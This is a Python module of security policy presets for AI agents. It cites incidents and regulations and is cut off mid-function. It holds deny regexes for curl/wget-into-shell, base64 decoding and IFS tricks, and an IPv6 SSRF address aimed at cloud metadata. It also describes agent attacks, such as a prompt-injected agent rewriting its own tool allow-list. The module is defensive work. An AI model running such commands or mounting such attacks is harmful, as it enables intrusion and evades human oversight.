"""2026 policy presets for Agent-Airlock.

Named policy factories that map public incidents, standards, and regulations
to a concrete `SecurityPolicy` + `CapabilityPolicy` configuration. Each preset
cites its primary source so reviewers can trace why a block fires.

Presets:

- `gtg_1002_defense_policy()` - Anthropic's GTG-1002 disclosure (Nov 2025):
  first largely-autonomous AI-orchestrated cyber-espionage. Blocks the
  reconnaissance + privilege-escalation + exfiltration tool patterns.

- `mex_gov_2026_policy()` - Mexican-government breach (Feb 2026, ~150 GB
  exfiltration via persistent-jailbreak prompt engineering). Blocks the
  unbounded-output-loop and unrestricted-egress patterns that made the
  leak possible.

- `owasp_mcp_top_10_2026_policy()` - OWASP MCP Top 10 (beta, Dec 2025).
  Covers MCP01 token mismanagement, MCP02 excessive permissions, MCP03
  tool poisoning, MCP04 supply chain, MCP05 command injection, MCP07
  insufficient authentication, MCP10 context oversharing.

- `eu_ai_act_article_15_policy()` - EU AI Act Article 15 (applies
  Aug 2, 2026). Cybersecurity controls for high-risk systems against
  data poisoning, model poisoning, adversarial examples, and
  confidentiality attacks.

- `india_dpdp_2023_policy()` - India Digital Personal Data Protection
  Act 2023 (notified Nov 13, 2025 by MeitY). Enforces purpose limitation,
  data minimization, and the India PII pack (Aadhaar / PAN / UPI / IFSC)
  at the sanitizer layer.

Each preset is documented, linked to its source, and paired with at least
one blocking test and one allow test in `tests/test_policy_presets.py`.

Usage:

    from agent_airlock import Airlock
    from agent_airlock.policy_presets import gtg_1002_defense_policy

    @Airlock(policy=gtg_1002_defense_policy())
    def run_shell(cmd: str) -> str:
        ...

Primary sources (retrieved 2026-04-18):

- Anthropic GTG-1002 disclosure: https://www.anthropic.com/news/detecting-countering-misuse-aug-2025
- Mexican government breach reporting: public press coverage Feb 2026
- OWASP MCP Top 10: https://owasp.org/www-project-mcp-top-10/
- OWASP Top 10 for Agentic Applications 2026:
  https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
- EU AI Act Article 15: https://artificialintelligenceact.eu/article/15/
- India DPDP Act 2023: https://www.meity.gov.in/static/uploads/2024/06/2bf1f0e9f04e6fb4f8fef35e82c42aa5.pdf
"""

from __future__ import annotations

import re
import shlex as _shlex_for_gitpilot
from collections.abc import Callable, Iterable, Mapping, Sequence
from dataclasses import dataclass
from pathlib import Path as _Path_for_gitpilot
from typing import TYPE_CHECKING, Any

from .cost_tracking import ModelTierBudget, TierBudget
from .exceptions import AirlockError
from .policy import SecurityPolicy, StdioGuardConfig
from .safe_types import SafeURLValidator

if TYPE_CHECKING:
    from .capabilities import CapabilityPolicy
    from .mcp_spec.header_audit import ResponseHeaderAuditConfig
    from .mcp_spec.meta_trust import MetaPin
    from .mcp_spec.oauth_audit import OAuthAppAuditConfig
    from .mcp_spec.sampling_guard import SamplingGuardConfig
    from .mcp_spec.step_up_scope_guard import AdmissionScopeSnapshot
    from .mcp_spec.tasks_lifecycle_guard import TaskAdmission, TaskRegistry


def _capabilities(granted: int | None = None, denied: int | None = None) -> CapabilityPolicy | None:
    """Build a CapabilityPolicy, returning None if the module isn't importable.

    Mirrors the private helpers in `policy.py` so capability gating remains
    optional.
    """
    try:
        from .capabilities import Capability, CapabilityPolicy

        return CapabilityPolicy(
            granted=Capability(granted) if granted is not None else Capability.NONE,
            denied=Capability(denied) if denied is not None else Capability.NONE,
            require_sandbox_for=Capability.DANGEROUS,
        )
    except ImportError:
        return None


# -----------------------------------------------------------------------------
# GTG-1002 defense
# -----------------------------------------------------------------------------


def gtg_1002_defense_policy() -> SecurityPolicy:
    """Defensive policy against the GTG-1002 tool-call pattern.

    GTG-1002 is the actor-code Anthropic assigned to the first largely-
    autonomous AI-orchestrated cyber-espionage campaign, publicly disclosed
    in late 2025. The operator used Claude as the orchestration brain plus
    an MCP-style tool harness to run reconnaissance, credential collection,
    lateral movement, and exfiltration against roughly 30 targets.

    What this preset does:

    - Requires agent identity (no anonymous invocations).
    - Applies a very low global rate limit (10/hour) - the campaign's tell
      was high-fan-out tool invocation; normal developer workloads stay
      well under this cap.
    - Blocks shell/exec tools by default (the observed attack path used
      arbitrary shell commands for recon and implant installation).
    - Requires sandbox execution for every `DANGEROUS` capability.
    - Denies filesystem delete and arbitrary network.

    Mitigates (mapped to public reporting):

    - Tool-call floods for reconnaissance/enumeration -> rate limit
    - Shell-based post-exploitation -> denied PROCESS_SHELL capability
    - Credential/data exfiltration -> denied NETWORK_ARBITRARY, sandbox
      required for any filesystem write

    Reference: Anthropic threat-intelligence disclosure (2025).
    Retrieved 2026-04-18.
    """
    try:
        from .capabilities import Capability

        cap_policy = _capabilities(
            granted=(Capability.FILESYSTEM_READ | Capability.NETWORK_HTTPS).value,
            denied=(
                Capability.PROCESS_SHELL
                | Capability.PROCESS_EXEC
                | Capability.FILESYSTEM_DELETE
                | Capability.NETWORK_ARBITRARY
            ).value,
        )
    except ImportError:
        cap_policy = None

    return SecurityPolicy(
        require_agent_id=True,
        denied_tools=[
            "exec_*",
            "shell_*",
            "run_shell",
            "spawn_*",
            "system_*",
        ],
        rate_limits={"*": "10/hour"},
        capability_policy=cap_policy,
    )


# -----------------------------------------------------------------------------
# Mexican government breach defense (Feb 2026)
# -----------------------------------------------------------------------------


def mex_gov_2026_policy() -> SecurityPolicy:
    """Defensive policy modeled on the Feb 2026 Mexican-government breach.

    Public reporting indicates ~150 GB of government data was exfiltrated
    through persistent-jailbreak prompt engineering against an agentic
    system with over-broad tool access. The load-bearing weaknesses: no
    per-session output cap, no egress allowlist, tools able to iterate
    across arbitrary document stores.

    What this preset does:

    - Allows ONLY explicit read operations matching tight tool-name
      patterns (`read_*`, `get_*`, `search_*`). Everything else is denied.
    - Requires agent identity.
    - Rate limit: 50/hour (tight; force the attacker to run slow).
    - Denies database write, filesystem write/delete, arbitrary network.
    - Sandboxes every `DANGEROUS` capability.

    Operators should additionally:

    1. Configure `max_output_chars` on `AirlockConfig` to cap per-call
       output size (this policy does NOT change that knob).
    2. Add a `ConversationTracker` with strict per-session budgets.

    Reference: public press coverage, Feb 2026. Retrieved 2026-04-18.
    """
    try:
        from .capabilities import Capability

        cap_policy = _capabilities(
            granted=(Capability.FILESYSTEM_READ | Capability.DATABASE_READ).value,
            denied=(
                Capability.FILESYSTEM_WRITE
                | Capability.FILESYSTEM_DELETE
                | Capability.DATABASE_WRITE
                | Capability.NETWORK_ARBITRARY
                | Capability.PROCESS_SHELL
            ).value,
        )
    except ImportError:
        cap_policy = None

    return SecurityPolicy(
        require_agent_id=True,
        allowed_tools=["read_*", "get_*", "search_*", "list_*", "describe_*"],
        denied_tools=[
            "dump_*",
            "export_*",
            "backup_*",
            "replicate_*",
            "bulk_*",
        ],
        rate_limits={"*": "50/hour"},
        capability_policy=cap_policy,
    )


# -----------------------------------------------------------------------------
# OWASP MCP Top 10 (beta, Dec 2025)
# -----------------------------------------------------------------------------


def owasp_mcp_top_10_2026_policy() -> SecurityPolicy:
    """Defensive policy aligned to the OWASP MCP Top 10 (2026 beta).

    The OWASP MCP Top 10 enumerates the most critical security risks in
    MCP-enabled systems. As of retrieval the live categories include:

    - MCP01 Token mismanagement & secret exposure
    - MCP02 Excessive permissions / scope creep
    - MCP03 Tool poisoning
    - MCP04 Software supply chain attacks
    - MCP05 Command injection
    - MCP06 (reserved)
    - MCP07 Insufficient authentication
    - MCP08 (reserved)
    - MCP09 Shadow MCP servers
    - MCP10 Context over-sharing

    What this preset does:

    - MCP02 / MCP07: `require_agent_id=True` + global rate limit blocks
      anonymous or unbounded use.
    - MCP05: denies tool-name patterns commonly used to construct shell
      commands (`exec_*`, `run_*`, `system_*`).
    - MCP03 / MCP04: denies `install_*`, `download_*`, `fetch_plugin_*`
      tool-name patterns that are typical supply-chain vectors.
    - Capability gating: denies PROCESS_SHELL, FILESYSTEM_DELETE,
      NETWORK_ARBITRARY; requires sandbox for DANGEROUS.

    This preset does NOT fix:

    - MCP01 (tokens in payload) - use the sanitizer (secrets masking
      is on by default in `SanitizationConfig`).
    - MCP10 (context oversharing) - use per-tenant
      `WorkspacePIIConfig` and a `ConversationTracker`.
    - MCP07 transport-level auth (use OAuth 2.1 on the MCP server).

    Reference: https://owasp.org/www-project-mcp-top-10/ (retrieved 2026-04-18).
    """
    try:
        from .capabilities import Capability

        cap_policy = _capabilities(
            granted=(
                Capability.FILESYSTEM_READ | Capability.NETWORK_HTTPS | Capability.DATABASE_READ
            ).value,
            denied=(
                Capability.PROCESS_SHELL
                | Capability.FILESYSTEM_DELETE
                | Capability.NETWORK_ARBITRARY
            ).value,
        )
    except ImportError:
        cap_policy = None

    return SecurityPolicy(
        require_agent_id=True,
        denied_tools=[
            # MCP05 Command injection
            "exec_*",
            "run_*",
            "system_*",
            "shell_*",
            # MCP03 / MCP04 Tool poisoning + supply chain
            "install_*",
            "download_plugin_*",
            "fetch_plugin_*",
            "load_extension_*",
            # MCP02 Excessive permissions (destructive verbs)
            "delete_all_*",
            "drop_*",
            "truncate_*",
        ],
        rate_limits={"*": "200/hour"},
        capability_policy=cap_policy,
    )


# -----------------------------------------------------------------------------
# EU AI Act Article 15 (cybersecurity, Aug 2, 2026)
# -----------------------------------------------------------------------------


def eu_ai_act_article_15_policy() -> SecurityPolicy:
    """Defensive policy mapping to EU AI Act Article 15 cybersecurity.

    Article 15 requires providers of high-risk AI systems to implement
    technical measures to prevent, detect, respond to, resolve, and
    control for attacks attempting to:

    - alter the system's use, outputs, or performance;
    - manipulate training or pre-trained components (data / model
      poisoning);
    - supply inputs designed to cause model errors (adversarial
      examples, evasion);
    - exfiltrate confidential information (confidentiality attacks).

    These obligations become applicable on 2 August 2026 for high-risk
    systems falling under Annex III.

    What this preset does (Article 15 mapping in parentheses):

    - Requires agent identity (15(4) monitoring). Every call attributable.
    - Rate-limits to 500/hour/tool (15(1) resilience against floods).
    - Denies `NETWORK_ARBITRARY` and requires sandbox for `DANGEROUS`
      (15(5) confidentiality and integrity of the system).
    - Denies filesystem delete (15(5) integrity).
    - Caller is also expected to enable `OTelAuditExporter` and a
      `ConversationTracker` - those are configuration, not policy.

    Note: this preset is a *starting point*. Compliance with Article 15
    is a process, not a config setting. Pair with the Article 12
    (record-keeping) and Article 14 (human oversight) controls on the
    application layer.

    Reference: https://artificialintelligenceact.eu/article/15/
    (retrieved 2026-04-18).
    """
    try:
        from .capabilities import Capability

        cap_policy = _capabilities(
            granted=(
                Capability.FILESYSTEM_READ | Capability.NETWORK_HTTPS | Capability.DATABASE_READ
            ).value,
            denied=(
                Capability.NETWORK_ARBITRARY
                | Capability.FILESYSTEM_DELETE
                | Capability.PROCESS_SHELL
            ).value,
        )
    except ImportError:
        cap_policy = None

    return SecurityPolicy(
        require_agent_id=True,
        rate_limits={"*": "500/hour"},
        capability_policy=cap_policy,
    )


# -----------------------------------------------------------------------------
# India DPDP Act 2023
# -----------------------------------------------------------------------------


def india_dpdp_2023_policy() -> SecurityPolicy:
    """Defensive policy aligned to India's DPDP Act 2023.

    The Digital Personal Data Protection Act, 2023 (notified by MeitY on
    Nov 13, 2025) applies to the processing of digital personal data
    within India or of data principals in India. Core principles:
    consent, purpose limitation, data minimization, accountability.

    What this preset does:

    - Requires agent identity (accountability: every processing
      attributable to a named fiduciary/processor).
    - Allows only read and list tool-name patterns by default (data
      minimization: no unnecessary writes without explicit policy
      override).
    - Denies bulk export tool-name patterns that typically breach
      purpose limitation.
    - Denies capabilities that process sensitive data unsafely
      (`DATA_PII` and `DATA_SECRETS` are denied unless granted by a
      caller-supplied override).
    - Rate-limits to 300/hour/tool.

    Operators should additionally enable:

    1. The sanitizer with India PII detectors (Aadhaar, PAN, UPI, IFSC)
       - these are on by default in `SensitiveDataType`.
    2. `WorkspacePIIConfig` for per-tenant masking rules.
    3. Audit export via `OTelAuditExporter` for DPB (Data Protection
       Board) audit trail.

    Reference:
    https://www.meity.gov.in/static/uploads/2024/06/2bf1f0e9f04e6fb4f8fef35e82c42aa5.pdf
    (retrieved 2026-04-18).
    """
    try:
        from .capabilities import Capability

        cap_policy = _capabilities(
            granted=(
                Capability.FILESYSTEM_READ | Capability.DATABASE_READ | Capability.NETWORK_HTTPS
            ).value,
            denied=(
                Capability.DATA_PII
                | Capability.DATA_SECRETS
                | Capability.FILESYSTEM_DELETE
                | Capability.DATABASE_WRITE
                | Capability.NETWORK_ARBITRARY
            ).value,
        )
    except ImportError:
        cap_policy = None

    return SecurityPolicy(
        require_agent_id=True,
        allowed_tools=["read_*", "get_*", "list_*", "search_*", "describe_*"],
        denied_tools=[
            "bulk_export_*",
            "dump_database_*",
            "download_personal_data_*",
            "export_all_*",
        ],
        rate_limits={"*": "300/hour"},
        capability_policy=cap_policy,
    )


@dataclass
class IndiaDPDP2023Bundle:
    """Composite handle returned by :func:`apply_india_dpdp_2023`.

    Bundles the two seams DPDP alignment spans so a caller gets both in one
    call: ``policy`` (the :func:`india_dpdp_2023_policy` tool/capability gate)
    and ``config`` (an :class:`~agent_airlock.config.AirlockConfig` with India
    PII masking pre-enabled — ``mask_pii`` / ``mask_secrets`` /
    ``sanitize_output`` on and ``"in"`` in ``pii_locales``). Without this the
    policy alone gates tools but the Aadhaar / PAN / UPI / IFSC maskers still
    need separate opt-in (the gap the policy's own docstring names).
    """

    config: Any
    policy: SecurityPolicy


def apply_india_dpdp_2023(config: Any | None = None) -> IndiaDPDP2023Bundle:
    """Return a config+policy bundle pre-wired for India DPDP 2023 alignment.

    One call delivers what :func:`india_dpdp_2023_policy` alone cannot: the
    DPDP tool/capability gate **plus** an :class:`AirlockConfig` that actually
    turns on the India PII maskers (Aadhaar Verhoeff-gated, PAN, UPI, IFSC,
    Devanagari names). The Aadhaar masker reveals only the last 4 digits
    (UIDAI masked-Aadhaar standard).

    Args:
        config: Optional starting :class:`AirlockConfig`. If None, a fresh one
            is created. Existing fields are preserved unless they conflict with
            the DPDP masking posture, in which case the stricter setting wins
            (masking is forced on and the ``"in"`` locale is added).

    Returns:
        :class:`IndiaDPDP2023Bundle` with the configured ``config`` + ``policy``.

    Example:
        >>> from agent_airlock import Airlock, apply_india_dpdp_2023
        >>> bundle = apply_india_dpdp_2023()
        >>> @Airlock(config=bundle.config, policy=bundle.policy)
        ... def lookup(q: str) -> str: ...
    """
    from .config import AirlockConfig

    if config is None:
        config = AirlockConfig()

    config.sanitize_output = True
    config.mask_pii = True
    config.mask_secrets = True
    if "in" not in config.pii_locales:
        config.pii_locales = [*config.pii_locales, "in"]

    return IndiaDPDP2023Bundle(config=config, policy=india_dpdp_2023_policy())


# -----------------------------------------------------------------------------
# Module-level eager instances for readability
# -----------------------------------------------------------------------------
# NOTE: these are constructed at import time. Each policy instance is
# immutable data (no live state) so sharing is safe. If you need a
# per-process fresh instance - e.g. to apply dynamic rate-limit overrides
# - call the factory function instead of using the constant.


def stdio_guard_ox_defaults() -> StdioGuardConfig:
    """Ox Security advisory defaults for the MCP STDIO sanitizer (v0.5.1+).

    Disclosed 2026-04-16: the MCP STDIO transport executed attacker-supplied
    argv before the handshake, giving pre-auth RCE across Claude Code,
    Cursor, Windsurf, Gemini-CLI, and GitHub Copilot. Anthropic declined a
    protocol-level fix; ``validate_stdio_command()`` + this preset is the
    client-side answer.

    Policy:

    - Binary allowlist: the common MCP launchers (``uvx``, ``npx``,
      ``pipx``, ``node``, ``python``, ``python3``, ``deno``, ``bunx``)
      plus the Python launcher ``uv``.
    - Absolute-path prefix allowlist: the system + user package dirs
      that Homebrew, apt, and pipx use. Anything outside these prefixes
      is rejected even if the basename would have matched — this is the
      ``/tmp/evil.sh`` defence.
    - Deny patterns: common remote-code patterns ``curl|wget piped into
      a shell``, ``base64 -d | sh``, python ``-c`` inline, and the
      literal ``IFS=`` tricks.
    - Shell metacharacters: always rejected (``;``, ``&&``, ``||``,
      ``|``, backtick, ``$(``, ``$``, newline, carriage return).

    Primary source:
      https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem
    """
    return StdioGuardConfig(
        allowed_binaries=frozenset(
            {
                "uvx",
                "uv",
                "npx",
                "pipx",
                "node",
                "python",
                "python3",
                "deno",
                "bunx",
            }
        ),
        allowed_binary_prefixes=(
            "/usr/bin/",
            "/usr/local/bin/",
            "/opt/homebrew/bin/",
            "/home/",  # pipx user installs: /home/$user/.local/bin/...
            "/Users/",  # macOS user installs
        ),
        deny_patterns=(
            re.compile(r"curl[^\n]*\bsh\b", re.IGNORECASE),
            re.compile(r"wget[^\n]*\bsh\b", re.IGNORECASE),
            re.compile(r"base64\s+-d", re.IGNORECASE),
            # Inline-code flags across interpreters we otherwise allow:
            # - python/bash:  -c
            # - node/deno:    -e / --eval
            # - perl:         -e
            re.compile(r"^-c$"),
            re.compile(r"^-e$"),
            re.compile(r"^--eval$"),
            re.compile(r"IFS\s*=", re.IGNORECASE),
        ),
        allow_shell_metachars=False,
    )


STDIO_GUARD_OX_DEFAULTS = stdio_guard_ox_defaults()
"""Eagerly-constructed default for the Ox STDIO sanitizer. Import this
constant unless you need dynamic overrides (then call the factory)."""


def mcp_attested_admission_defaults(
    *,
    trust_root: Any = None,
    enforcement_mode: str = "ENFORCE",
    max_clearance_age_days: int = 30,
    clearance_well_known_path: str = "/.well-known/mcp-clearance",
) -> Any:
    """MCP Attested Tool-Server Admission preset (RFC arXiv:2605.24248).

    Returns a deny-by-default ``AttestedAdmissionConfig`` that gates
    every MCP tool dispatch on a clearance assertion fetched from
    ``{server_url}{clearance_well_known_path}`` and verified offline
    against ``trust_root``. The verified clearance carries a per-server
    tool allowlist; tools outside the allowlist are denied — admitting
    a server is not the same as trusting its every tool.

    Failure model: **fail closed.** In ``ENFORCE`` mode (default), a
    missing / invalid / expired clearance denies. In ``WARN`` mode the
    same case is logged and admitted, so operators can stage the
    enforcement turn-up against real traffic.

    Every admission decision emits a
    :class:`agent_airlock.attest.ReceiptVerdict` on the
    ``guard="mcp_attested_admission"`` channel, so the existing
    ``airlock attest`` DSSE pipeline picks decisions up unchanged.

    This preset is **opt-in**: pass the returned config to
    :class:`agent_airlock.mcp_proxy_guard.MCPProxyConfig` via the
    ``attested_admission`` field, then call
    :meth:`MCPProxyGuard.audit_tool_admission` before each tool dispatch.
    Existing callers are unaffected.

    Signature verification requires the ``[attested]`` extra
    (``pip install agent-airlock[attested]``). The extra pulls in
    ``cryptography`` for offline Ed25519 / RSA-PSS verification; the
    base install stays zero-runtime-dep.

    Args:
        trust_root: A
            :class:`agent_airlock.mcp_spec.attested_admission.TrustRoot`
            holding pinned public-key material. ``None`` produces a
            placeholder config that will refuse to verify anything —
            operators are expected to supply a real trust root.
        enforcement_mode: ``"ENFORCE"`` (deny on missing/invalid/expired)
            or ``"WARN"`` (log only, admit).
        max_clearance_age_days: Clearance is considered fresh iff
            ``now() - iat <= max_clearance_age_days``. Defaults to 30
            days, matching the RFC's recommended rotation window.
        clearance_well_known_path: URI path relative to each MCP server's
            origin. Defaults to ``/.well-known/mcp-clearance``.

    Primary source:
      https://arxiv.org/abs/2605.24248
      (Metere, *Attested Tool-Server Admission*, May 2026)
    """
    # Local import: keep `policy_presets` importable without the
    # [attested] extra. The `cryptography` import inside
    # `attested_admission` itself is also lazy.
    from datetime import timedelta

    from .mcp_spec.attested_admission import AttestedAdmissionConfig

    return AttestedAdmissionConfig(
        trust_root=trust_root,
        clearance_well_known_path=clearance_well_known_path,
        enforcement_mode=enforcement_mode,  # type: ignore[arg-type]
        max_clearance_age=timedelta(days=max_clearance_age_days),
    )


def oauth_audit_vercel_2026_defaults() -> OAuthAppAuditConfig:
    """OAuth app audit defaults driven by the 2026-04-19 Vercel breach.

    Vercel confirmed a compromise that started with a third-party
    Google Workspace OAuth app (Context.ai). The attacker used the
    app's legitimate consent flow to exfiltrate an employee's tokens
    and, from there, 580 employee records + API keys + source code.
    This preset seeds the deny-list with the Context.ai client_id
    disclosed in the Vercel bulletin and enforces PKCE + refresh-
    rotation + a 1-hour token-lifetime cap.

    Pair with ``MCPProxyGuard`` so any OAuth exchange run through
    ``agent_airlock.mcp_spec.oauth`` is audited before the token is
    cached.

    Primary source:
      https://vercel.com/kb/bulletin/vercel-april-2026-security-incident
    """
    from .mcp_spec.oauth_audit import KNOWN_COMPROMISED_CLIENT_IDS, OAuthAppAuditConfig

    return OAuthAppAuditConfig(
        blocked_client_ids=KNOWN_COMPROMISED_CLIENT_IDS,
        max_token_age_seconds=3600,
        require_pkce=True,
        require_refresh_rotation=True,
    )


OAUTH_AUDIT_VERCEL_2026_DEFAULTS = oauth_audit_vercel_2026_defaults()
"""Eagerly-constructed OAuth-audit defaults (post Vercel 2026-04-19)."""


def azure_mcp_cve_2026_32211_defaults() -> ResponseHeaderAuditConfig:
    """Response-header audit defaults for CVE-2026-32211.

    MSRC disclosed 2026-04-20: the reference Azure MCP server echoed
    the caller's ``Authorization`` header back in a ``WWW-Authenticate``
    field on 401 responses, leaking short-lived AAD tokens. CVSS 8.6,
    fixed in Azure MCP Server 1.4.2. This preset is the runtime
    defence — a proxy fronting an unpatched server will refuse to
    forward the leaked value.

    Primary sources:
      https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-32211
      https://nvd.nist.gov/vuln/detail/CVE-2026-32211
    """
    from .mcp_spec.header_audit import (
        DEFAULT_FORBIDDEN_HEADER_NAMES_BY_STATUS,
        DEFAULT_FORBIDDEN_PATTERNS,
        ResponseHeaderAuditConfig,
    )

    return ResponseHeaderAuditConfig(
        forbidden_patterns=DEFAULT_FORBIDDEN_PATTERNS,
        forbidden_header_names_by_status=dict(DEFAULT_FORBIDDEN_HEADER_NAMES_BY_STATUS),
        max_header_value_bytes=8192,
    )


AZURE_MCP_CVE_2026_32211_DEFAULTS = azure_mcp_cve_2026_32211_defaults()
"""Eagerly-constructed response-header-audit defaults (CVE-2026-32211)."""


def ox_mcp_supply_chain_2026_04_defaults() -> dict[str, Any]:
    """Umbrella preset for the OX Security 2026-04-20 MCP dossier.

    Composes existing primitives (MCPwn / Flowise / Azure header
    audit) and adds three new micro-checks (tool-manifest tamper,
    MCP bridge SSRF, unsafe deserialization) into a single bundle
    covering the 10 CVEs disclosed in the "Mother of All AI Supply
    Chains" report.

    The returned mapping lets callers cherry-pick::

        cfg = ox_mcp_supply_chain_2026_04_defaults()
        cfg["destructive_tool_check"](my_tools)
        cfg["eval_token_check"](my_tools)
        cfg["header_audit"]                 # ResponseHeaderAuditConfig
        cfg["tool_registry"]                # ToolDefinitionRegistry
        cfg["bridge_ssrf_check"](target)    # callable
        cfg["content_type_check"](ct, name) # callable

    Primary source:
      https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20
    """
    from .mcp_spec.supply_chain import (
        ToolDefinitionRegistry,
        check_mcp_bridge_target,
        check_tool_response_content_type,
    )

    return {
        "destructive_tool_check": mcpwn_cve_2026_33032_check,
        "eval_token_check": flowise_cve_2025_59528_check,
        "header_audit": azure_mcp_cve_2026_32211_defaults(),
        "tool_registry": ToolDefinitionRegistry(),
        "bridge_ssrf_check": check_mcp_bridge_target,
        "content_type_check": check_tool_response_content_type,
        # v0.8.16: CVE-2026-40933 is the Flowise MCP-stdio adapter RCE
        # (CVSS 9.9) — NOT a "Semantic Kernel auth-header leak" as this
        # bundle previously mis-recorded. Wire the correct primitive:
        # the Flowise-stdio command-injection guard's ``check`` callable.
        "flowise_stdio_check": flowise_mcp_stdio_guard_2026_defaults()["check"],
        "source": ("https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20"),
        "cves": (
            "CVE-2025-65720",
            "CVE-2026-30615",
            "CVE-2026-30617",
            "CVE-2026-30618",
            "CVE-2026-30623",
            "CVE-2026-30624",
            "CVE-2026-30625",
            "CVE-2026-26015",
            "CVE-2026-33224",
            "CVE-2026-40933",
        ),
    }


# -----------------------------------------------------------------------------
# Unit 42 MCP sampling attack-vector preset (2026-04-24)
# -----------------------------------------------------------------------------


def unit42_mcp_sampling_defaults() -> SamplingGuardConfig:
    """Sampling-guard defaults for the Unit 42 MCP attack-vector catalog.

    Palo Alto Networks Unit 42 published a catalog of MCP sampling-layer
    abuses on 2026-04-24. Three patterns are in scope here: quota
    exhaustion, persistent system-role injection, and session-sticky
    consent bypass. This preset turns on the opt-in defenses the
    catalog recommends.

    Defaults:

    - ``max_sampling_requests_per_session`` = 50 (hard cap)
    - ``max_tokens_per_sampling_request`` = 4096
    - ``forbid_persistent_instructions`` = True (refuse system role)
    - ``require_user_consent_per_request`` = True (no session-sticky OK)

    Usage::

        from agent_airlock.policy_presets import unit42_mcp_sampling_defaults
        from agent_airlock.mcp_spec.sampling_guard import (
            SamplingSessionState,
            audit_sampling_request,
        )

        cfg = unit42_mcp_sampling_defaults()
        state = SamplingSessionState(session_id=req.session_id)
        audit_sampling_request(req.body, state, cfg, user_consented=ok)

    Primary source:
      https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/
    """
    from .mcp_spec.sampling_guard import SamplingGuardConfig

    return SamplingGuardConfig(
        max_sampling_requests_per_session=50,
        max_tokens_per_sampling_request=4096,
        forbid_persistent_instructions=True,
        require_user_consent_per_request=True,
    )


UNIT42_MCP_SAMPLING_DEFAULTS = unit42_mcp_sampling_defaults()
"""Eagerly-constructed sampling-guard defaults (Unit 42 2026-04-24)."""


# -----------------------------------------------------------------------------
# OpenClaw CVE-2026-41349 — agentic consent-bypass (frozen-policy preset)
# -----------------------------------------------------------------------------


def openclaw_cve_2026_41349_defaults(
    base_policy: SecurityPolicy | None = None,
) -> SecurityPolicy:
    """Return a frozen ``SecurityPolicy`` guarding against CVE-2026-41349.

    OpenClaw agentic consent-bypass disclosed 2026-04-23 (CVSS 8.8).
    Exploit pattern: a prompt-injected agent rewrote its own
    ``allowed_tools`` / ``denied_tools`` mid-session, then invoked a
    tool the human operator had never approved. The ``config.patch``
    family of tool names was the visible tell in the advisory.

    This preset:

    1. Accepts an optional base policy (or defaults to a conservative
       template that forbids ``*config_patch*`` / ``*update_policy*``
       / ``*mutate_policy*`` tool name patterns, which are the
       advisory's named attack surface).
    2. Returns a :meth:`~SecurityPolicy.freeze`-d deep copy.
    3. The hosting ``Airlock`` dispatch re-verifies the digest before
       every tool call (see ``core.py``). Any mutation of the policy
       after this factory returns will raise
       :class:`PolicyMutationError`.

    Usage::

        from agent_airlock import Airlock
        from agent_airlock.policy_presets import openclaw_cve_2026_41349_defaults

        @Airlock(policy=openclaw_cve_2026_41349_defaults())
        def do_work(...): ...

    Primary source:
      https://www.thehackerwire.com/vulnerability/CVE-2026-41349/
    """
    policy = base_policy if base_policy is not None else SecurityPolicy()
    # Refuse the three known attack-surface name classes unless the
    # base policy already denied them (idempotent union).
    canary_denies = {"*config_patch*", "*update_policy*", "*mutate_policy*"}
    existing_denies = set(policy.denied_tools)
    merged = SecurityPolicy(
        allowed_tools=list(policy.allowed_tools),
        denied_tools=sorted(existing_denies | canary_denies),
        time_restrictions=dict(policy.time_restrictions),
        rate_limits=dict(policy.rate_limits),
        require_agent_id=policy.require_agent_id,
        allowed_roles=list(policy.allowed_roles),
        capability_policy=policy.capability_policy,
    )
    return merged.freeze()


# -----------------------------------------------------------------------------
# OpenClaw CVE-2026-41361 — IPv6 SSRF guard bypass (EndpointPolicy preset)
# -----------------------------------------------------------------------------


def openclaw_cve_2026_41361_ipv6_ssrf_defaults() -> dict[str, Any]:
    """Return the IPv6-range guard and a callable check for CVE-2026-41361.

    OpenClaw's IPv6 allow-list covered only ``::/128``, ``::1/128``,
    ``fe80::/10``, and ``fc00::/7``, leaving IPv4-mapped, NAT64, 6to4,
    and documentation ranges routable. Attackers used
    ``::ffff:169.254.169.254`` (IPv4-mapped) to reach AWS IMDS
    through a server that believed its IPv6 policy was complete.
    CVSS 7.1, disclosed 2026-04-23.

    Returned mapping::

        cfg = openclaw_cve_2026_41361_ipv6_ssrf_defaults()
        cfg["is_blocked"](addr)     # callable -> bool
        cfg["networks"]             # tuple[(cidr, reason), ...]
        cfg["source"]               # primary-source URL

    Primary source:
      https://www.redpacketsecurity.com/cve-alert-cve-2026-41361-openclaw-openclaw/
    """
    from .network import _BLOCKED_IPV6_NETWORKS, is_blocked_ipv6_range

    return {
        "is_blocked": is_blocked_ipv6_range,
        "networks": _BLOCKED_IPV6_NETWORKS,
        "source": ("https://www.redpacketsecurity.com/cve-alert-cve-2026-41361-openclaw-openclaw/"),
    }


# -----------------------------------------------------------------------------
# ModelCapabilityTier — offensive-cyber-capable model restrictions (v0.5.5+)
# -----------------------------------------------------------------------------


def offensive_cyber_model_defaults(model_id: str) -> CapabilityPolicy:
    """Return a ``CapabilityPolicy`` sized to the given model's tier.

    Introduced in response to the Anthropic Claude Mythos Preview
    disclosure (2026-04-23 InfoQ): frontier models can now chain
    reconnaissance + exploit synthesis autonomously. For such models,
    shell + network + unbounded filesystem writes should be denied
    unless the caller explicitly opts in by layering their own
    permissive policy on top.

    Behavior by tier:

    - ``STANDARD`` → empty restrictions (caller owns policy entirely).
    - ``OFFENSIVE_CYBER_CAPABLE`` → deny ``PROCESS_SHELL``,
      ``FILESYSTEM_WRITE``, ``FILESYSTEM_DELETE``, ``NETWORK_ARBITRARY``.
    - ``ZERO_DAY_CAPABLE`` → same as above plus ``PROCESS_EXEC``,
      ``NETWORK_HTTP`` / ``NETWORK_HTTPS`` denied — the model must
      run inside a sandbox with no network at all.

    Args:
        model_id: The driving LLM's model identifier.

    Returns:
        A :class:`CapabilityPolicy` with ``model_tier`` stamped and
        ``denied`` populated per the tier table.

    Primary source:
      https://www.infoq.com/news/2026/04/anthropic-claude-mythos/
    """
    from .capabilities import Capability, CapabilityPolicy, ModelCapabilityTier
    from .integrations.model_tier import classify_model

    tier = classify_model(model_id)

    if tier is ModelCapabilityTier.STANDARD:
        denied = Capability.NONE
